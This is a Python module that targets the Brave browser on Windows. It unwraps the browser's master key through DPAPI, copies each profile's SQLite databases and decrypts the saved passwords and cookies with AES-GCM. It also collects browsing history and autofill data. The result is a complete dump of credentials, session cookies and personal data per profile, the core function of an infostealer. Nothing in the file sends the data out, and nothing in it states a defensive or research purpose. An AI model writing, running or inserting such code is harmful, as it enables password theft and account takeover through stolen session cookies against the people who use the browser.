import os
import shutil
import json
import base64
import sqlite3
from contextlib import closing
import win32crypt
from Cryptodome.Cipher import AES

AppData = os.environ["USERPROFILE"] + "\\AppData"

def getProfiles():
    profiles = []
    path = AppData + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\"

    for d in os.listdir(path):
        if os.path.exists(path + d + "\\Sessions"):
            profiles.append({
                "name": d,
                "path": path + d,
                "has_cookies": os.path.exists(path + d + "\\Cookies"),
                "has_logins": os.path.exists(path + d + "\\Login Data"),
                "has_history": os.path.exists(path + d + "\\History"),
                "has_form_history": os.path.exists(path + d + "\\Web Data")
            })
            
    return profiles

def getEncKey():
    with open(AppData + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def getLogindata(path):
    if not os.path.exists(".\\temp"):
        os.mkdir(".\\temp");

    shutil.copyfile(path + "\\Login Data", ".\\temp\\logins");

    with closing(sqlite3.connect(".\\temp\\logins")) as con, con, closing(con.cursor()) as cur:
            cur.execute("SELECT * FROM logins")
            db_logins = cur.fetchall()

    shutil.rmtree(".\\temp")

    key = getEncKey()

    logins = []
    for login in db_logins:
        ciphertext = login[5]
        cipher = AES.new(key, AES.MODE_GCM, ciphertext[3:15])
        password = cipher.decrypt(ciphertext[15:-16]).decode()

        logins.append({
            "id": login[21],
            "name": login[15],
            "url": login[0],
            "action": login[1],
            "usename": login[3],
            "password": password,
            "realm": login[7],
            "date_created": login[8],
            "date_used": login[22]
        })

    return logins

def getCookies(path):
    cookies = []
    if not os.path.exists(".\\temp"):
        os.mkdir(".\\temp");

    shutil.copyfile(path + "\\Cookies", ".\\temp\\cookies");

    with closing(sqlite3.connect(".\\temp\\cookies")) as con, con, closing(con.cursor()) as cur:
            con.text_factory = bytes
            cur.execute("SELECT host_key, name, path, expires_utc, encrypted_value FROM cookies")
            cookie_db = cur.fetchall()

    shutil.rmtree(".\\temp")

    key = getEncKey()

    for cd in cookie_db:
        c = cd[4]
        cipher = AES.new(key, AES.MODE_GCM, nonce=c[3:3+12])

        cookies.append({
            "host": cd[0].decode("utf-8"),
            "path": cd[2].decode("utf-8"),
            "name": cd[1].decode("utf-8"),
            "value": cipher.decrypt_and_verify(c[3+12:-16], c[-16:]).decode("utf-8"),
            "expires": cd[3],
        })


    return cookies

def getHistory(path):
    history = []
    if not os.path.exists(".\\temp"):
        os.mkdir(".\\temp");

    shutil.copyfile(path + "\\History", ".\\temp\\history");

    with closing(sqlite3.connect(".\\temp\\history")) as con, con, closing(con.cursor()) as cur:
            cur.execute("SELECT id, url, title FROM urls")
            url_db = cur.fetchall()

            cur.execute("SELECT id, url, visit_time, visit_duration FROM visits")
            visit_db = cur.fetchall()
            
    shutil.rmtree(".\\temp")

    urls = {}
    for ud in url_db:
        urls[ud[0]] = {
            "title": ud[2],
            "url": ud[1]
        }

    for vd in visit_db:
        url = urls[vd[1]]
        history.append({
            "id": vd[0],
            "title": url["title"],
            "url": url["url"],
            "visit_time": vd[2],
            "visit_duration": vd[3]
        })

    return history

def getFormHistory(path):
    fills = []

    if not os.path.exists(".\\temp"):
        os.mkdir(".\\temp");

    shutil.copyfile(path + "\\Web Data", ".\\temp\\web_data");

    with closing(sqlite3.connect(".\\temp\\web_data")) as con, con, closing(con.cursor()) as cur:
            cur.execute("SELECT * FROM autofill")
            autofills = cur.fetchall()

    for fill in autofills:
        fills.append({
            "name": fill[0],
            "value": fill[1],
            "lower_value": fill[2], #.decode("utf-8")
            "date_created": fill[3],
            "date_used": fill[4],
            "used": fill[5]
        })

    shutil.rmtree(".\\temp")

    return fills

def getAllData():
    if not os.path.exists(AppData + "\\Local\\BraveSoftware\\Brave-Browser\\"):
        return []

    profiles = getProfiles()

    for profile in profiles:
        profile["logins"] = [] if not profile["has_logins"] else getLogindata(profile["path"])
        profile["history"] = [] if not profile["has_history"] else getHistory(profile["path"])
        profile["cookies"] = [] if not profile["has_cookies"] else getCookies(profile["path"])
        profile["form_history"] = [] if not profile["has_form_history"] else getFormHistory(profile["path"])
            
    return profiles